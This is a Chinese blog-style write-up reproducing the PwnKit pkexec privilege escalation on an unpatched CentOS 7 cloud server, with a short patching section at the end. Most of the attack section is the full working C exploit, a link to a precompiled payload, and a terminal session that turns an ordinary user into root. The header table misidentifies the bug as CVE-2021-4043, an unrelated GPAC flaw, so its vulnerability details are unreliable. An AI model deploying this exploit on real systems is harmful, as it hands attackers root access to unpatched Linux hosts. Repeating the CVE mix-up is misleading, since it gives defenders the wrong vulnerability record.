
# 实验步骤

# CVE-2021-4043 Linux本地提权漏洞
 
|CNVD-ID	CNVD-2022-22323|
|-------|
|公开日期	2022-03-24|
|危害级别	中 (AV:N/AC:M/Au:N/C:N/I:N/A:P)|
|影响产品	GPAC GPAC <1.1.0
|CVE ID	CVE-2021-4043|
|漏洞描述	GPAC是一款开源的多媒体框架。
|GPAC 1.1.0之前版本存在代码问题漏洞，该漏洞源于软件中存在NULL指针解引用。目前没有详细漏洞细节提供|
|漏洞类型	通用型漏洞|
|参考链接	https://nvd.nist.gov/vuln/detail/CVE-2021-4043|
|漏洞解决方案	目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
https://github.com/gpac/gpac/commit/64a2e1b799352ac7d7aad1989bc06e7b0f2b01db|
|厂商补丁	gpac代码问题漏洞（CNVD-2022-22323）的补丁
验证信息	(暂无验证信息)|
|报送时间 2022-02-10|
|收录时间 2022-03-24|
|更新时间 2022-03-24|

# 实验背景

> 今天登录阿里云服务器突然发现了一个提权漏洞，先利用一波玩玩。

![image.png](https://geekrabbit-1308222610.cos.ap-beijing.myqcloud.com/image_1649920710256.png)

# 实验环境

- **带有漏洞的centos7系统**

- **附带编译好的palyload下载链接[CVE-2021-4034](https://pan.jinke.icu:200/?explorer/share/file&hash=bfd49Lo430gaJX0xcZt5Q8jVCHIlcrLFyZJCh_Bu6qLG2oZemeMejOIwX4meVCH9SQk4)**

# 漏洞复现

###### 构造payload

**在GitHub找到了payload[https://github.com/arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	fp = fopen("pwnkit/pwnkit.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```
###### 用gcc编译后上传到阿里云

```bash
[root@local ~]# touch cve20124043.c
[root@local ~]# vim cve20124043.c
[root@local ~]# ls
cve20124043.c  
[root@local ~]# gcc cve20124043.c   -o cve20124043
[root@local ~]# ls
cve20124043  cve20124043.c  
```
![image.png](https://geekrabbit-1308222610.cos.ap-beijing.myqcloud.com/image_1649923281918.png)

###### 执行payload

```bash
[rabbit@iZj6c2ktpckmd5r3q2dfrhZ ~]$ ls
cve20124043                                                //上传编译好的paload  

[rabbit@iZj6c2ktpckmd5r3q2dfrhZ ~]$ id                     //查看用户为rabbit

uid=1004(rabbit) gid=1004(rabbit) groups=1004(rabbit)
[rabbit@iZj6c2ktpckmd5r3q2dfrhZ ~]$ ./cve20124043          //执行payload

sh-4.2# id
uid=0(root) gid=0(root) groups=0(root),1004(rabbit)        //成功提权
```

![image.png](https://geekrabbit-1308222610.cos.ap-beijing.myqcloud.com/image_1649923029193.png)


# 漏洞修复

**CentOS 用户可采用如下命令升级到安全版本或更高版本：**
> 
>  `yum clean all && yum makecache yum update polkit -y`
> `
> 
> 
> 验证修复，通过以下命令可查看 Polkit 是否为安全版本：
> 
> `rpm -qa polkit` 

**Ubuntu 用户可采用如下命令升级至安全版本或更高版本：**
> 
> `sudo apt-get update sudo apt-get install policykit-1`
> 
> 
>验证修复，通过以下命令可查看 Polkit 是否为安全版本：
> 
> `dpkg -l policykit-1`


